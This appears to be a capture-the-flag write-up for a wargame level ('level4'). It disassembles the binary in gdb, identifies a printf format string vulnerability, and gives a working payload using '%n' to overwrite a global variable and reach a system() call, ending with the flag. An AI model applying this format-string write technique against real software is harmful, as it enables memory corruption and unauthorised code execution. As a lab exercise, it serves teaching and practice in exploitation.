# Analyze

Start by examining the functions in the binary:

```bash
(gdb) info functions
[...]
0x08048444  p
0x08048457  n
0x080484a7  main
[...]
(gdb) disassemble main
Dump of assembler code for function main:
   0x080484a7 <+0>:     push   %ebp
   0x080484a8 <+1>:     mov    %esp,%ebp
   0x080484aa <+3>:     and    $0xfffffff0,%esp
   0x080484ad <+6>:     call   0x8048457 <n>
   0x080484b2 <+11>:    leave
   0x080484b3 <+12>:    ret
End of assembler dump.
(gdb) disassemble n
Dump of assembler code for function n:
   0x08048457 <+0>:     push   %ebp
   0x08048458 <+1>:     mov    %esp,%ebp
   0x0804845a <+3>:     sub    $0x218,%esp
   0x08048460 <+9>:     mov    0x8049804,%eax
   0x08048465 <+14>:    mov    %eax,0x8(%esp)
   0x08048469 <+18>:    movl   $0x200,0x4(%esp)
   0x08048471 <+26>:    lea    -0x208(%ebp),%eax
   0x08048477 <+32>:    mov    %eax,(%esp)
   0x0804847a <+35>:    call   0x8048350 <fgets@plt>
   0x0804847f <+40>:    lea    -0x208(%ebp),%eax
   0x08048485 <+46>:    mov    %eax,(%esp)
   0x08048488 <+49>:    call   0x8048444 <p>
   0x0804848d <+54>:    mov    0x8049810,%eax
   0x08048492 <+59>:    cmp    $0x1025544,%eax
   0x08048497 <+64>:    jne    0x80484a5 <n+78>
   0x08048499 <+66>:    movl   $0x8048590,(%esp)
   0x080484a0 <+73>:    call   0x8048360 <system@plt>
   0x080484a5 <+78>:    leave
   0x080484a6 <+79>:    ret
End of assembler dump.
(gdb) disassemble p
Dump of assembler code for function p:
   0x08048444 <+0>:     push   %ebp
   0x08048445 <+1>:     mov    %esp,%ebp
   0x08048447 <+3>:     sub    $0x18,%esp
   0x0804844a <+6>:     mov    0x8(%ebp),%eax
   0x0804844d <+9>:     mov    %eax,(%esp)
   0x08048450 <+12>:    call   0x8048340 <printf@plt>
   0x08048455 <+17>:    leave
   0x08048456 <+18>:    ret
End of assembler dump.
```

## Key Observations
- `main` calls `n`.
- `n` checks a variable against the value 16930116 and calls `p`.
- `p` uses `printf` with its parameter as an argument, making it vulnerable to format string exploits.

# Clue for Exploration

Think about how the `printf` function in `p` could be manipulated:

- **Understanding `printf`**: How does `printf` handle user-supplied format strings? What if the format specifiers are not controlled?
- **Stack Layout**: How is data arranged on the stack in a function call? How might this influence the behavior of `printf`?

Experimenting with different inputs and observing the output can reveal how your data is positioned in the stack, guiding you towards a successful exploit.

# Exploit

Utilize a similar approach as in the previous level to exploit the format string vulnerability.

## Finding the Address

Determine the stack position of our input string:

```bash
$ python -c 'print("AAAA" + "%x %x %x %x %x %x %x %x %x %x %x %x")' | ./level4
AAAAb7ff26b0 bffff784 b7fd0ff4 0 0 bffff748 804848d bffff540 200 b7fd1ac0 b7ff37d0 41414141
```

In this output, `41414141` (hexadecimal for "AAAA") indicates the position of our input on the stack.

## Constructing the Payload

Craft and execute the payload to modify the specified memory address:

```bash
$ python -c 'print("\x08\x04\x98\x10"[::-1] + "%16930112p" + "%12$n")' | ./level4
```

This payload:
- Writes the memory address `\x08\x04\x98\x10` (reversed due to little-endian format).
- Uses `%16930112p` to pad the output until it has written a total of 16930116 bytes.
- `%12$n` writes this number of bytes to the 12th position on the stack, which corresponds to our target variable.

## Exploit Success

Executing this payload successfully modifies the target variable, leading to the desired behavior in the program:

```plaintext
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```

The exploit works!
